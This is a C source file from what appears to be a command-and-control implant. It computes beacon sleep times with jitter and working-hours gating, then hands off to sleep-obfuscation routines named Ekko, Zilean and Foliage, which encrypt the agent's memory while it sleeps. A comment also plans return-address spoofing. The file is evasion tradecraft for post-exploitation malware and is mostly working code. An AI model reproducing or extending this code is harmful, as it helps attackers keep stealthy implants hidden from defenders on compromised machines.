#include "SleepObfMain.h"


UINT GetSleepTime() {
	UINT SleepTime = agent->config->SleepTime * 1000;
	UINT Variation = (agent->config->SleepJitter * SleepTime) / 100;

	DWORD Rand = 0;
	UINT WorkingHours = agent->config->WorkingHours;

	SYSTEMTIME SysTime = { 0 };
	WORD StartHour = 0;
	WORD STartMinute = 0;
	WORD EndHour = 0;
	WORD EndMinute = 0;

	if (!InWorkingHours()) {

		/*
		If we are not within working hours we will calculate the time required to sleep until we're back in working hours again.

		*/

		if (SleepTime)
		{
			SleepTime = 0; //reset our timer.

			StartHour = (WorkingHours >> 17) & 0b011111;
			STartMinute = (WorkingHours >> 11) & 0b111111;
			EndHour = (WorkingHours >> 6) & 0b011111;
			EndMinute = (WorkingHours >> 0) & 0b111111;

			agent->apis->pGetLocalTime(&SysTime);

			if (SysTime.wHour == EndHour && SysTime.wMinute > EndMinute || SysTime.wHour > EndHour) // if we're just over the working hours or 1hr + over the working hours.
			{
				SleepTime += (24 - SysTime.wHour - 1) * 60 + (60 - SysTime.wMinute); // if time is 4:30 pm SleepTime = 450

				SleepTime += StartHour * 60 + STartMinute; // if time is 4:30 pm SleepTime = 450  and start time = 8:00 am SleepTime = 450 + 480 + 0 = 930
			}
			else
			{
				SleepTime += (StartHour - SysTime.wHour) * 60 + (STartMinute - SysTime.wMinute); // if we start the agent at 6:00 AM but working hours at 8:00-17:00 SleepTime = 8-6 = 2 * 60 + 0 = 120
			}

			SleepTime *= 1000; // convert minutes to milliseconds.
		}
	} // WorkingHours

	else // only add jitter if we're within working hours.
	{
		Rand = GenerateRandomNumber();
		Rand = Rand % Variation;

		if (Rand % 2 == 0) // if rand is even number add the variation to the sleep time.
			SleepTime += Rand;
		else // if rand is odd number subtract the variation from the sleep time.
			SleepTime -= Rand;
	}

	return SleepTime;
}

void PerformSleepObf()
{
	UINT TimeToSleep = GetSleepTime();

	if (TimeToSleep == 0)
		return;

#if _WIN64
	if (agent->ActiveThreads) {
		return; // there are currently running threads. We cannot encrypt the image's memory and sleep b/c it would ruin the thread execution.
	}

#ifdef _Ekko

	if (!EkkoSleepObf(TimeToSleep))
	{
		//TODO have return address spoofing implemented here.
		WaitForSingleObject(NtCurrentProcess(), TimeToSleep, FALSE);
	}

	return;

#elif _Zilean

	if (!ZileanSleepObf(TimeToSleep))
	{
		//TODO have return address spoofing implemented here.
		WaitForSingleObject(NtCurrentProcess(), TimeToSleep, FALSE);
	}

	return;

#elif _FOLIAGE

	if (!FoliageSleepObf(TimeToSleep))
	{
		//TODO have return address spoofing implemented here.
		WaitForSingleObject(NtCurrentProcess(), TimeToSleep, FALSE);
	}

	return;

#else 
	WaitForSingleObject(NtCurrentProcess(), TimeToSleep, FALSE);
#endif

#else
	WaitForSingleObject(NtCurrentProcess(), TimeToSleep, FALSE);
#endif
}